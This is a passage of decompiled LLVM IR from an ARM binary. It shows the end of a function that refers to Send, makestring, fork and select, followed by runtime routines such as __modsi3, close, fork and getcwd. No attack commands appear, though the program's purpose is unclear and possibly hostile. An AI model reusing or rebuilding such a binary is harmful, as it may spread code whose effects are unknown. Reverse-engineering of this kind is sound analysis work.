  store i32 ptrtoint (i32* @global_var_14028.389 to i32), i32* @r1, align 4
  %v6_a87c = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_14028.389 to i32), i32 ptrtoint ([4 x i8]** @global_var_1e434.392 to i32), i32 %v4_a864, i32 ptrtoint (i32* @0 to i32))
  %v2_a88c = icmp eq i32 %v6_a87c, 0
  br i1 %v2_a88c, label %dec_label_pc_a334.lr.ph, label %dec_label_pc_a894

dec_label_pc_a894:                                ; preds = %dec_label_pc_a628, %dec_label_pc_a874
  %storemerge34.in = phi i32 [ %v6_a87c, %dec_label_pc_a874 ], [ %v6_a658, %dec_label_pc_a628 ]
  %storemerge34 = inttoptr i32 %storemerge34.in to i8*
  %v2_a898 = load i8, i8* %storemerge34, align 1
  %v2_a89c = icmp eq i8 %v2_a898, 0
  br i1 %v2_a89c, label %dec_label_pc_a334.lr.ph, label %dec_label_pc_a668

; uselistorder directives
  uselistorder i8* %storemerge34, { 5, 3, 4, 2, 1, 0 }
  uselistorder i32 %storemerge34.in, { 7, 3, 2, 5, 4, 1, 0, 6 }
  uselistorder i32* %v7_a84c, { 1, 0 }
  uselistorder i32 %v1_a83c, { 1, 0 }
  uselistorder i32 %storemerge21118, { 1, 0 }
  uselistorder i32 %.pre36, { 1, 0 }
  uselistorder i32 %storemerge20, { 1, 0, 3, 2 }
  uselistorder i32 %.pre, { 1, 0 }
  uselistorder i32 %storemerge23, { 2, 1, 0, 3 }
  uselistorder i32 %v5_a610, { 1, 0, 2 }
  uselistorder i32 %v2_a5ac, { 2, 1, 0 }
  uselistorder i32 %v1_a550, { 1, 0 }
  uselistorder i32 %v3_a51c, { 1, 0 }
  uselistorder i32 %storemerge18101, { 1, 0 }
  uselistorder i32 %v1_a500, { 1, 0 }
  uselistorder i32 %v1_a4cc, { 1, 0 }
  uselistorder i32 %v2_a4c8, { 1, 0 }
  uselistorder i32 %v1_a44c, { 0, 2, 1 }
  uselistorder i32 %v1_a4cc90, { 1, 0 }
  uselistorder i32 %.pre132, { 1, 4, 0, 3, 2 }
  uselistorder i32 %storemerge16114, { 1, 0 }
  uselistorder i32 %v2_a360, { 1, 0 }
  uselistorder i32 %storemerge1529, { 1, 0 }
  uselistorder i32 %v2_a5fc, { 0, 2, 1 }
  uselistorder i32 %v2_a320, { 1, 0 }
  uselistorder i32 %v1_a228, { 1, 0 }
  uselistorder i32 %storemerge14, { 2, 0, 1 }
  uselistorder i32 %v3_a0b4, { 1, 0, 2 }
  uselistorder i32 %v2_a028, { 0, 1, 3, 2 }
  uselistorder i32 %stack_var_-76.0, { 2, 0, 1, 3 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-1684, { 1, 2, 0, 3 }
  uselistorder i32 ptrtoint ([4 x i8]** @global_var_1e434.392 to i32), { 1, 2, 0 }
  uselistorder [4 x i8]** @global_var_1e434.392, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_strtok, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_14028.389 to i32), { 0, 2, 1, 3 }
  uselistorder i32* @global_var_20e74.289, { 1, 3, 4, 5, 0, 6, 7, 8, 2, 9, 10 }
  uselistorder i32* @global_var_1e7fc.287, { 7, 8, 1, 5, 9, 10, 2, 0, 11, 3, 12, 4, 6, 13 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @Send, { 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32* @global_var_20e5c.344, { 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0, 1 }
  uselistorder i32* @global_var_20e64.353, { 0, 1, 4, 2, 5, 6, 7, 3 }
  uselistorder i32* @global_var_20e54.379, { 1, 0 }
  uselistorder i32* @global_var_20e50.295, { 1, 0 }
  uselistorder i32* @global_var_20e58.315, { 2, 0, 1, 3, 4, 5, 6, 7 }
  uselistorder i32 (i32)* @makestring, { 3, 2, 1, 0 }
  uselistorder i32 ()* @__libc_fork, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_13e94.293 to i32), { 0, 3, 1, 4, 2, 5 }
  uselistorder i8** %argv, { 1, 0, 2 }
  uselistorder label %dec_label_pc_a894, { 1, 0 }
  uselistorder label %dec_label_pc_a7d4, { 1, 0 }
  uselistorder label %dec_label_pc_a74c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a698, { 1, 0 }
  uselistorder label %dec_label_pc_a588, { 1, 0 }
  uselistorder label %dec_label_pc_a56c, { 1, 0 }
  uselistorder label %dec_label_pc_a518, { 1, 0 }
  uselistorder label %dec_label_pc_a458, { 1, 0 }
  uselistorder label %dec_label_pc_a334, { 1, 0 }
  uselistorder label %dec_label_pc_a334.lr.ph, { 3, 2, 1, 0, 4 }
  uselistorder label %dec_label_pc_a2c0, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_a1d8, { 1, 0 }
  uselistorder label %dec_label_pc_a114, { 1, 0 }
  uselistorder label %dec_label_pc_a0fc, { 4, 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_9fe4, { 1, 0 }
  uselistorder label %dec_label_pc_9f70, { 1, 0 }
}

define i32 @__modsi3(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_a90c = icmp eq i32 %arg2, 0
  br i1 %v2_a90c, label %dec_label_pc_a9e0, label %dec_label_pc_a914

dec_label_pc_a914:                                ; preds = %entry
  %v1_a90c = icmp slt i32 %arg2, 0
  br i1 %v1_a90c, label %bb, label %bb79

bb:                                               ; preds = %dec_label_pc_a914
  %v2_a914 = sub i32 0, %arg2
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_a914, %bb
  %v4_a92c = phi i32 [ %arg2, %dec_label_pc_a914 ], [ %v2_a914, %bb ]
  %v0_a918 = load i32, i32* @r0, align 4
  %v1_a918 = icmp slt i32 %v0_a918, 0
  br i1 %v1_a918, label %bb80, label %bb81

bb80:                                             ; preds = %bb79
  %v2_a91c = sub i32 0, %v0_a918
  br label %bb81

bb81:                                             ; preds = %bb79, %bb80
  %v1_a924 = phi i32 [ %v0_a918, %bb79 ], [ %v2_a91c, %bb80 ]
  %v1_a920 = add i32 %v4_a92c, -1
  %v7_a920 = icmp eq i32 %v4_a92c, 1
  br i1 %v7_a920, label %.thread70, label %bb82

bb82:                                             ; preds = %bb81
  %v10_a924 = icmp eq i32 %v1_a924, %v4_a92c
  br i1 %v10_a924, label %.thread70, label %bb83

.thread70:                                        ; preds = %bb81, %bb82
  br label %.thread72

bb83:                                             ; preds = %bb82
  %v4_a924 = icmp ult i32 %v1_a924, %v4_a92c
  br i1 %v4_a924, label %.thread6, label %bb84

bb84:                                             ; preds = %bb83
  %v6_a92c = and i32 %v1_a920, %v4_a92c
  %v8_a92c = icmp eq i32 %v6_a92c, 0
  br i1 %v8_a92c, label %.thread72, label %dec_label_pc_a93c.preheader

dec_label_pc_a93c.preheader:                      ; preds = %bb84
  %v2_a93c109 = icmp ugt i32 %v4_a92c, 268435455
  br i1 %v2_a93c109, label %.thread1, label %bb85

.thread72:                                        ; preds = %bb84, %.thread70
  %v1_a93064 = phi i32 [ %v1_a924, %bb84 ], [ 0, %.thread70 ]
  %v3_a930 = and i32 %v1_a93064, %v1_a920
  br label %.thread6

.thread1:                                         ; preds = %.thread2.thread7, %dec_label_pc_a93c.preheader
  %v0_a950.pr35.lcssa = phi i32 [ %v4_a92c, %dec_label_pc_a93c.preheader ], [ %v4_a944, %.thread2.thread7 ]
  %storemerge.lcssa = phi i32 [ 0, %dec_label_pc_a93c.preheader ], [ %v2_a9489, %.thread2.thread7 ]
  br label %dec_label_pc_a950thread-pre-split.loopexit

bb85:                                             ; preds = %dec_label_pc_a93c.preheader, %.thread2.thread7
  %storemerge111 = phi i32 [ %v2_a9489, %.thread2.thread7 ], [ 0, %dec_label_pc_a93c.preheader ]
  %v0_a950.pr35110 = phi i32 [ %v4_a944, %.thread2.thread7 ], [ %v4_a92c, %dec_label_pc_a93c.preheader ]
  %v4_a940 = icmp ult i32 %v0_a950.pr35110, %v1_a924
  br i1 %v4_a940, label %bb86, label %dec_label_pc_a950thread-pre-split.loopexit.loopexit

bb86:                                             ; preds = %bb85
  %v2_a944 = and i32 %v0_a950.pr35110, 268435456
  %v3_a944 = icmp eq i32 %v2_a944, 0
  %v4_a944 = mul i32 %v0_a950.pr35110, 16
  br i1 %v3_a944, label %.thread2.thread7, label %dec_label_pc_a950.loopexit

.thread2.thread7:                                 ; preds = %bb86
  %v2_a9489 = add i32 %storemerge111, 4
  %v2_a93c = icmp ugt i32 %v4_a944, 268435455
  br i1 %v2_a93c, label %.thread1, label %bb85

dec_label_pc_a950thread-pre-split.loopexit.loopexit: ; preds = %bb85
  br label %dec_label_pc_a950thread-pre-split.loopexit

dec_label_pc_a950thread-pre-split.loopexit:       ; preds = %dec_label_pc_a950thread-pre-split.loopexit.loopexit, %.thread1
  %v0_a950.pr35108 = phi i32 [ %v0_a950.pr35.lcssa, %.thread1 ], [ %v0_a950.pr35110, %dec_label_pc_a950thread-pre-split.loopexit.loopexit ]
  %storemerge105 = phi i32 [ %storemerge.lcssa, %.thread1 ], [ %storemerge111, %dec_label_pc_a950thread-pre-split.loopexit.loopexit ]
  br label %dec_label_pc_a950thread-pre-split

dec_label_pc_a950thread-pre-split:                ; preds = %.thread4, %dec_label_pc_a950thread-pre-split.loopexit
  %v1_a95c41 = phi i32 [ %storemerge105, %dec_label_pc_a950thread-pre-split.loopexit ], [ %v2_a95c, %.thread4 ]
  %v2_a95436 = phi i32 [ %v1_a924, %dec_label_pc_a950thread-pre-split.loopexit ], [ %v2_a954, %.thread4 ]
  %v0_a950.pr = phi i32 [ %v0_a950.pr35108, %dec_label_pc_a950thread-pre-split.loopexit ], [ %v3_a958, %.thread4 ]
  br label %dec_label_pc_a950

dec_label_pc_a950.loopexit:                       ; preds = %bb86
  br label %dec_label_pc_a950

dec_label_pc_a950:                                ; preds = %dec_label_pc_a950.loopexit, %dec_label_pc_a950thread-pre-split
  %v0_a964.pr = phi i32 [ %v1_a95c41, %dec_label_pc_a950thread-pre-split ], [ %storemerge111, %dec_label_pc_a950.loopexit ]
  %v2_a954 = phi i32 [ %v2_a95436, %dec_label_pc_a950thread-pre-split ], [ %v1_a924, %dec_label_pc_a950.loopexit ]
  %v1_a958 = phi i32 [ %v0_a950.pr, %dec_label_pc_a950thread-pre-split ], [ %v4_a944, %dec_label_pc_a950.loopexit ]
  %v2_a950 = icmp slt i32 %v1_a958, 0
  br i1 %v2_a950, label %dec_label_pc_a964, label %bb87

bb87:                                             ; preds = %dec_label_pc_a950
  %v4_a954 = icmp ult i32 %v1_a958, %v2_a954
  br i1 %v4_a954, label %.thread4, label %dec_label_pc_a964

.thread4:                                         ; preds = %bb87
  %v3_a958 = mul i32 %v1_a958, 2
  %v2_a95c = add i32 %v0_a964.pr, 1
  br label %dec_label_pc_a950thread-pre-split

dec_label_pc_a964:                                ; preds = %bb87, %dec_label_pc_a950
  %v2_a964 = add i32 %v0_a964.pr, -3
  %v5_a968 = icmp slt i32 %v0_a964.pr, 3
  br i1 %v5_a968, label %dec_label_pc_a9a8, label %dec_label_pc_a96c

dec_label_pc_a96c:                                ; preds = %dec_label_pc_a964, %bb91
  %v6_a994 = phi i32 [ %v0_a99c, %bb91 ], [ %v2_a964, %dec_label_pc_a964 ]
  %v1_a970 = phi i32 [ %v1_a978.v6_a978.v6_a980.v6_a988, %bb91 ], [ %v2_a954, %dec_label_pc_a964 ]
  %v3_a99010 = phi i32 [ %v3_a990, %bb91 ], [ %v1_a958, %dec_label_pc_a964 ]
  %v3_a96c = icmp ult i32 %v1_a970, %v3_a99010
  %v3_a970 = select i1 %v3_a96c, i32 0, i32 %v3_a99010
  %v1_a978 = sub i32 %v1_a970, %v3_a970
  %v4_a974 = udiv i32 %v3_a99010, 2
  %v6_a974 = icmp ult i32 %v1_a978, %v4_a974
  %v6_a978 = select i1 %v6_a974, i32 0, i32 %v4_a974
  %v1_a978.v6_a978 = sub i32 %v1_a978, %v6_a978
  %.demorgan = and i1 %v3_a96c, %v6_a974
  %v4_a97c = udiv i32 %v3_a99010, 4
  %v6_a97c = icmp ult i32 %v1_a978.v6_a978, %v4_a97c
  %v6_a980 = select i1 %v6_a97c, i32 0, i32 %v4_a97c
  %v1_a978.v6_a978.v6_a980 = sub i32 %v1_a978.v6_a978, %v6_a980
  %.demorgan76 = and i1 %.demorgan, %v6_a97c
  %v4_a984 = udiv i32 %v3_a99010, 8
  %v6_a984 = icmp ult i32 %v1_a978.v6_a978.v6_a980, %v4_a984
  %v6_a988 = select i1 %v6_a984, i32 0, i32 %v4_a984
  %v1_a978.v6_a978.v6_a980.v6_a988 = sub i32 %v1_a978.v6_a978.v6_a980, %v6_a988
  %.demorgan77 = and i1 %.demorgan76, %v6_a984
  br i1 %.demorgan77, label %bb89, label %bb88

bb88:                                             ; preds = %dec_label_pc_a96c
  br label %bb89

bb89:                                             ; preds = %dec_label_pc_a96c, %bb88
  %v2_a98c = add i32 %v1_a978.v6_a978.v6_a980.v6_a988, -1
  %v4_a98c = sub i32 0, %v1_a978.v6_a978.v6_a980.v6_a988
  %v5_a98c = and i32 %v1_a978.v6_a978.v6_a980.v6_a988, %v4_a98c
  %v3_a990 = udiv i32 %v3_a99010, 16
  %v5_a994 = icmp slt i32 %v1_a978.v6_a978.v6_a980.v6_a988, 1
  br i1 %v5_a994, label %bb91, label %bb90

bb90:                                             ; preds = %bb89
  %v7_a994 = add i32 %v6_a994, -4
  %v9_a994 = sub i32 3, %v6_a994
  %v10_a994 = and i32 %v9_a994, %v6_a994
  br label %bb91

bb91:                                             ; preds = %bb89, %bb90
  %v0_a99c = phi i32 [ %v6_a994, %bb89 ], [ %v7_a994, %bb90 ]
  %v0_a99813.in = phi i32 [ %v2_a98c, %bb89 ], [ %v7_a994, %bb90 ]
  %v1_a99812.in = phi i32 [ %v5_a98c, %bb89 ], [ %v10_a994, %bb90 ]
  %v1_a99812 = icmp slt i32 %v1_a99812.in, 0
  %v0_a99813 = icmp slt i32 %v0_a99813.in, 0
  %v2_a998 = xor i1 %v0_a99813, %v1_a99812
  br i1 %v2_a998, label %dec_label_pc_a99c, label %dec_label_pc_a96c

dec_label_pc_a99c:                                ; preds = %bb91
  %v1_a99c = urem i32 %v0_a99c, 4
  %v2_a99c = icmp eq i32 %v1_a99c, 0
  br i1 %v2_a99c, label %.thread6, label %bb92

bb92:                                             ; preds = %dec_label_pc_a99c
  %v3_a9a0 = icmp eq i32 %v1_a978.v6_a978.v6_a980.v6_a988, 0
  br i1 %v3_a9a0, label %.thread6, label %dec_label_pc_a9a8

dec_label_pc_a9a8:                                ; preds = %bb92, %dec_label_pc_a964
  %v0_a9bc = phi i32 [ %v3_a990, %bb92 ], [ %v1_a958, %dec_label_pc_a964 ]
  %v1_a9b8 = phi i32 [ %v1_a978.v6_a978.v6_a980.v6_a988, %bb92 ], [ %v2_a954, %dec_label_pc_a964 ]
  %v0_a9a8 = phi i32 [ %v0_a99c, %bb92 ], [ %v2_a964, %dec_label_pc_a964 ]
  %v5_a9ac = icmp slt i32 %v0_a9a8, -2
  br i1 %v5_a9ac, label %dec_label_pc_a9cc, label %dec_label_pc_a9b0

dec_label_pc_a9b0:                                ; preds = %dec_label_pc_a9a8
  %v8_a9a8 = icmp eq i32 %v0_a9a8, -2
  br i1 %v8_a9a8, label %dec_label_pc_a9c0, label %dec_label_pc_a9b4

dec_label_pc_a9b4:                                ; preds = %dec_label_pc_a9b0
  %v3_a9b4 = icmp ult i32 %v1_a9b8, %v0_a9bc
  br i1 %v3_a9b4, label %bb94, label %bb93

bb93:                                             ; preds = %dec_label_pc_a9b4
  %v2_a9b4 = sub i32 %v1_a9b8, %v0_a9bc
  br label %bb94

bb94:                                             ; preds = %dec_label_pc_a9b4, %bb93
  %v0_a9c054 = phi i32 [ %v1_a9b8, %dec_label_pc_a9b4 ], [ %v2_a9b4, %bb93 ]
  %v3_a9bc = udiv i32 %v0_a9bc, 2
  br label %dec_label_pc_a9c0

dec_label_pc_a9c0:                                ; preds = %dec_label_pc_a9b0, %bb94
  %v0_a9c8 = phi i32 [ %v0_a9bc, %dec_label_pc_a9b0 ], [ %v3_a9bc, %bb94 ]
  %v1_a9c4 = phi i32 [ %v1_a9b8, %dec_label_pc_a9b0 ], [ %v0_a9c054, %bb94 ]
  %v3_a9c0 = icmp ult i32 %v1_a9c4, %v0_a9c8
  br i1 %v3_a9c0, label %bb96, label %bb95

bb95:                                             ; preds = %dec_label_pc_a9c0
  %v2_a9c0 = sub i32 %v1_a9c4, %v0_a9c8
  br label %bb96

bb96:                                             ; preds = %dec_label_pc_a9c0, %bb95
  %v0_a9cc57 = phi i32 [ %v1_a9c4, %dec_label_pc_a9c0 ], [ %v2_a9c0, %bb95 ]
  %v3_a9c8 = udiv i32 %v0_a9c8, 2
  br label %dec_label_pc_a9cc

dec_label_pc_a9cc:                                ; preds = %dec_label_pc_a9a8, %bb96
  %v2_a9d0 = phi i32 [ %v0_a9bc, %dec_label_pc_a9a8 ], [ %v3_a9c8, %bb96 ]
  %v1_a9d0 = phi i32 [ %v1_a9b8, %dec_label_pc_a9a8 ], [ %v0_a9cc57, %bb96 ]
  %v3_a9cc = icmp ult i32 %v1_a9d0, %v2_a9d0
  br i1 %v3_a9cc, label %.thread6, label %bb97

bb97:                                             ; preds = %dec_label_pc_a9cc
  %v2_a9cc = sub i32 %v1_a9d0, %v2_a9d0
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_a9cc, %bb83, %.thread72, %dec_label_pc_a99c, %bb92, %bb97
  %v1_a9d8 = phi i32 [ %v1_a978.v6_a978.v6_a980.v6_a988, %dec_label_pc_a99c ], [ 0, %bb92 ], [ %v1_a9d0, %dec_label_pc_a9cc ], [ %v2_a9cc, %bb97 ], [ %v3_a930, %.thread72 ], [ %v1_a924, %bb83 ]
  br i1 %v1_a918, label %bb98, label %bb99

bb98:                                             ; preds = %.thread6
  %v2_a9d8 = sub i32 0, %v1_a9d8
  br label %bb99

bb99:                                             ; preds = %.thread6, %bb98
  %v1_a9dc = phi i32 [ %v1_a9d8, %.thread6 ], [ %v2_a9d8, %bb98 ]
  ret i32 %v1_a9dc

dec_label_pc_a9e0:                                ; preds = %entry
  %v0_a9e0 = load i32, i32* @lr, align 4
  %v0_a9e4 = call i32 @__aeabi_ldiv0()
  call void @__pseudo_branch(i32 %v0_a9e0)
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_a9bc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_a99c, { 1, 0, 2 }
  uselistorder i32 %v7_a994, { 1, 0 }
  uselistorder i32 %v3_a990, { 1, 0 }
  uselistorder i32 %v1_a978.v6_a978.v6_a980.v6_a988, { 0, 1, 2, 7, 5, 6, 4, 3 }
  uselistorder i32 %v4_a984, { 1, 0 }
  uselistorder i32 %v4_a97c, { 1, 0 }
  uselistorder i32 %v4_a974, { 1, 0 }
  uselistorder i32 %v6_a994, { 3, 0, 2, 1 }
  uselistorder i32 %v2_a964, { 1, 0 }
  uselistorder i32 %v1_a958, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v2_a954, { 1, 0, 3, 2 }
  uselistorder i32 %v4_a944, { 1, 0, 3, 2 }
  uselistorder i32 %v0_a950.pr35110, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a924, { 0, 2, 3, 1, 4, 6, 5 }
  uselistorder i32 %v4_a92c, { 1, 0, 2, 3, 5, 4, 6, 7 }
  uselistorder i32 %arg2, { 3, 2, 1, 0 }
  uselistorder label %bb99, { 1, 0 }
  uselistorder label %.thread6, { 5, 0, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_a9cc, { 1, 0 }
  uselistorder label %bb96, { 1, 0 }
  uselistorder label %dec_label_pc_a9c0, { 1, 0 }
  uselistorder label %bb94, { 1, 0 }
  uselistorder label %bb91, { 1, 0 }
  uselistorder label %bb89, { 1, 0 }
  uselistorder label %dec_label_pc_a96c, { 1, 0 }
  uselistorder label %bb85, { 1, 0 }
  uselistorder label %.thread70, { 1, 0 }
  uselistorder label %bb81, { 1, 0 }
  uselistorder label %bb79, { 1, 0 }
}

define i32 @__aeabi_ldiv0() local_unnamed_addr {
entry:
  %v1_a9f0 = load i32, i32* @r0, align 4
  ret i32 %v1_a9f0
}

define i32 @__libc_close(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_a9f4 = load i32, i32* @r4, align 4
  store i32 %v3_a9f4, i32* %stack_var_-8, align 4
  %v1_a9f8 = call i32 @close(i32 %arg1)
  store i32 %v1_a9f8, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v1_a9f8, -4095
  br i1 %tmp, label %dec_label_pc_aa18, label %dec_label_pc_aa08

dec_label_pc_aa08:                                ; preds = %entry
  %v0_aa08 = call i32 @__errno_location()
  %v0_aa0c = load i32, i32* %r4.global-to-local, align 4
  %v1_aa0c = sub i32 0, %v0_aa0c
  %v2_aa10 = inttoptr i32 %v0_aa08 to i32*
  store i32 %v1_aa0c, i32* %v2_aa10, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_aa18

dec_label_pc_aa18:                                ; preds = %entry, %dec_label_pc_aa08
  %v0_aa18 = phi i32 [ %v1_a9f8, %entry ], [ -1, %dec_label_pc_aa08 ]
  %v2_aa1c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_aa1c, i32* @r4, align 4
  ret i32 %v0_aa18

; uselistorder directives
  uselistorder i32 %v1_a9f8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aa18, { 1, 0 }
}

define i32 @__libc_fork() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_aa20 = load i32, i32* @r4, align 4
  store i32 %v3_aa20, i32* %stack_var_-8, align 4
  %v0_aa24 = call i32 @fork()
  store i32 %v0_aa24, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %v0_aa24, -4095
  br i1 %tmp, label %dec_label_pc_aa44, label %dec_label_pc_aa34

dec_label_pc_aa34:                                ; preds = %entry
  %v0_aa34 = call i32 @__errno_location()
  %v0_aa38 = load i32, i32* %r4.global-to-local, align 4
  %v1_aa38 = sub i32 0, %v0_aa38
  %v2_aa3c = inttoptr i32 %v0_aa34 to i32*
  store i32 %v1_aa38, i32* %v2_aa3c, align 4
  store i32 -1, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_aa44

dec_label_pc_aa44:                                ; preds = %entry, %dec_label_pc_aa34
  %v0_aa44 = phi i32 [ %v0_aa24, %entry ], [ -1, %dec_label_pc_aa34 ]
  %v2_aa48 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_aa48, i32* @r4, align 4
  ret i32 %v0_aa44

; uselistorder directives
  uselistorder i32 %v0_aa24, { 1, 0, 2 }
  uselistorder label %dec_label_pc_aa44, { 1, 0 }
}

define i32 @getcwd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %v3_aa4c = load i32, i32* @r4, align 4
  store i32 %v3_aa4c, i32* %stack_var_-20, align 4
  %v6_aa4c = load i32, i32* @r5, align 4
  %v9_aa4c = load i32, i32* @r6, align 4
  %v12_aa4c = load i32, i32* @r7, align 4
  store i32 %arg2, i32* @r7, align 4
  %v2_aa50 = icmp eq i32 %arg2, 0
  store i32 %arg1, i32* @r5, align 4
  %v2_aa5c = icmp eq i32 %arg1, 0
  br i1 %v2_aa50, label %dec_label_pc_aa5c, label %dec_label_pc_aa8c

dec_label_pc_aa5c:                                ; preds = %entry
  br i1 %v2_aa5c, label %dec_label_pc_aa78, label %dec_label_pc_aa64

dec_label_pc_aa64:                                ; preds = %dec_label_pc_aa5c
  %v0_aa64 = call i32 @__errno_location()
  %v0_aa68 = load i32, i32* @r7, align 4
  store i32 %v0_aa68, i32* @r5, align 4
  %v2_aa70 = inttoptr i32 %v0_aa64 to i32*
  store i32 22, i32* %v2_aa70, align 4
  br label %dec_label_pc_ab1c

dec_label_pc_aa78:                                ; preds = %dec_label_pc_aa5c
  %v0_aa78 = call i32 @__GI_getpagesize()
  %v5_aa80 = icmp slt i32 %v0_aa78, 4096
  br i1 %v5_aa80, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_aa78
  store i32 %v0_aa78, i32* @r4, align 4
  br label %dec_label_pc_aa9c

bb15:                                             ; preds = %dec_label_pc_aa78
  store i32 4096, i32* @r4, align 4
  br label %dec_label_pc_aa9c

dec_label_pc_aa8c:                                ; preds = %entry
  store i32 %arg2, i32* @r4, align 4
  br i1 %v2_aa5c, label %dec_label_pc_aa9c, label %bb16

bb16:                                             ; preds = %dec_label_pc_aa8c
  store i32 %arg1, i32* @r6, align 4
  br label %dec_label_pc_aaac

dec_label_pc_aa9c:                                ; preds = %dec_label_pc_aa8c, %bb, %bb15
  %v0_aa9c = phi i32 [ %v0_aa78, %bb ], [ 4096, %bb15 ], [ %arg2, %dec_label_pc_aa8c ]
  %v1_aaa0 = call i32 @malloc(i32 %v0_aa9c)
  store i32 %v1_aaa0, i32* @r6, align 4
  %v2_aaa4 = icmp eq i32 %v1_aaa0, 0
  br i1 %v2_aaa4, label %dec_label_pc_ab18, label %dec_label_pc_aa9c.dec_label_pc_aaac_crit_edge

dec_label_pc_aa9c.dec_label_pc_aaac_crit_edge:    ; preds = %dec_label_pc_aa9c
  %v0_aaac.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_aaac

dec_label_pc_aaac:                                ; preds = %bb16, %dec_label_pc_aa9c.dec_label_pc_aaac_crit_edge
  %v0_aab0 = phi i32 [ %v1_aaa0, %dec_label_pc_aa9c.dec_label_pc_aaac_crit_edge ], [ %arg1, %bb16 ]
  %v0_aaac = phi i32 [ %v0_aaac.pre, %dec_label_pc_aa9c.dec_label_pc_aaac_crit_edge ], [ %arg2, %bb16 ]
  %v2_aab4 = call i32 @getcwd(i32 %v0_aab0, i32 %v0_aaac)
  store i32 %v2_aab4, i32* @r4, align 4
  %tmp = icmp ult i32 %v2_aab4, -4095
  br i1 %tmp, label %dec_label_pc_aad4, label %dec_label_pc_aac4

dec_label_pc_aac4:                                ; preds = %dec_label_pc_aaac
  %v0_aac4 = call i32 @__errno_location()
  %v0_aac8 = load i32, i32* @r4, align 4
  %v1_aac8 = sub i32 0, %v0_aac8
  %v2_aacc = inttoptr i32 %v0_aac4 to i32*
  store i32 %v1_aac8, i32* %v2_aacc, align 4
  br label %dec_label_pc_ab04

dec_label_pc_aad4:                                ; preds = %dec_label_pc_aaac
  %v1_aad4 = icmp slt i32 %v2_aab4, 0
  br i1 %v1_aad4, label %dec_label_pc_ab04, label %dec_label_pc_aadc

dec_label_pc_aadc:                                ; preds = %dec_label_pc_aad4
  %v0_aadc = load i32, i32* @r5, align 4
  %v2_aadc = icmp eq i32 %v0_aadc, 0
  br i1 %v2_aadc, label %bb17, label %dec_label_pc_aaf8.thread7

dec_label_pc_aaf8.thread7:                        ; preds = %dec_label_pc_aadc
  br label %dec_label_pc_ab1c

bb17:                                             ; preds = %dec_label_pc_aadc
  %v1_aae0 = load i32, i32* @r7, align 4
  %v3_aae0 = icmp eq i32 %v1_aae0, 0
  br i1 %v3_aae0, label %dec_label_pc_aaf8, label %dec_label_pc_aaf8.thread

dec_label_pc_aaf8.thread:                         ; preds = %bb17
  br label %bb18

dec_label_pc_aaf8:                                ; preds = %bb17
  %v0_aaec = load i32, i32* @r6, align 4
  %v2_aaf0 = call i32 @realloc(i32 %v0_aaec, i32 %v2_aab4)
  store i32 %v2_aaf0, i32* @r5, align 4
  %v2_aaf8 = icmp eq i32 %v2_aaf0, 0
  br i1 %v2_aaf8, label %bb18, label %dec_label_pc_ab1c

bb18:                                             ; preds = %dec_label_pc_aaf8.thread, %dec_label_pc_aaf8
  %v1_aafc = load i32, i32* @r6, align 4
  store i32 %v1_aafc, i32* @r5, align 4
  br label %dec_label_pc_ab1c

dec_label_pc_ab04:                                ; preds = %dec_label_pc_aad4, %dec_label_pc_aac4
  %v0_ab04 = load i32, i32* @r5, align 4
  %v2_ab04 = icmp eq i32 %v0_ab04, 0
  br i1 %v2_ab04, label %dec_label_pc_ab0c, label %dec_label_pc_ab18

dec_label_pc_ab0c:                                ; preds = %dec_label_pc_ab04
  %v0_ab0c = load i32, i32* @r6, align 4
  store i32 %v0_ab0c, i32* @r0, align 4
  %v0_ab10 = call i32 @free()
  br label %dec_label_pc_ab1c

dec_label_pc_ab18:                                ; preds = %dec_label_pc_ab04, %dec_label_pc_aa9c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_ab1c

dec_label_pc_ab1c:                                ; preds = %dec_label_pc_aaf8.thread7, %bb18, %dec_label_pc_aaf8, %dec_label_pc_ab0c, %dec_label_pc_aa64, %dec_label_pc_ab18
  %v0_ab1c = load i32, i32* @r5, align 4
  %v2_ab20 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_ab20, i32* @r4, align 4
  store i32 %v6_aa4c, i32* @r5, align 4
  store i32 %v9_aa4c, i32* @r6, align 4
  store i32 %v12_aa4c, i32* @r7, align 4
  ret i32 %v0_ab1c

; uselistorder directives
  uselistorder i32 %v2_aab4, { 3, 2, 0, 1 }
  uselistorder i32 %v0_aa78, { 0, 2, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
